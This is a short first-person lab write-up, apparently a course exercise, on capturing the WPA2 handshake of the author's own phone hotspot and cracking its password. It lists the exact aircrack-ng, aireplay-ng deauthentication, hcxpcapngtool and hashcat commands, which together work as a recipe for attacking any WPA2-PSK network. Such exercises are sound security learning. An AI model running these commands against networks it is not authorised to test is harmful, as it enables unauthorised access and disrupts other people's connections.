I tried to do the exercise with my mac and phone only. But seems like my mac can't capture the handshake. So I used an ubuntu to monitor traffic and capture the WPA2 handshake, my mac as something that tries to connect to my phone's hubspot (access point).
I used aircrack for the packet captures and finding the handshake. Used wireshark to check if I have found the handshake and then used hashcat to find the password used in the connection.
1) I downloaded aircrack-ng
   `sudo apt install aircrack-ng`
2) Then checked for what can cause problems with aircrack 
   `sudo airmon-ng check wlo1`
3) Started airmon-ng which monitored the traffic through wlo1 interface
   `sudo airmon-ng start wlo1`
4) Found my hotspot with `sudo airodump-ng wlo1mon`
   ` D6:F4:9B:67:C0:1F  -38       11        0    0  11  360   WPA2 CCMP   PSK  G6_7099`
5) Then I started to capture packets
   `sudo airodump-ng -c 11 --bssid D6:F4:9B:67:C0:1F -w capture wlo1mon`
6) I forced a re-authentication with
   `sudo aireplay-ng -0 10 -a D6:F4:9B:67:C0:1F wlo1mon`
7) stopped the capture and checked the pcap file in wireshark with filter `eapol`, I saw some packets which means I have got the handshake.
8) Using `hcxpcapngtool -o handshake.22000 capture-02.cap` I have converted it to hashcat 22000 format.
9) Ran hashcat with a custom password file `hashcat -m 22000 handshake.22000 passwordsWIFI --force` and found the password.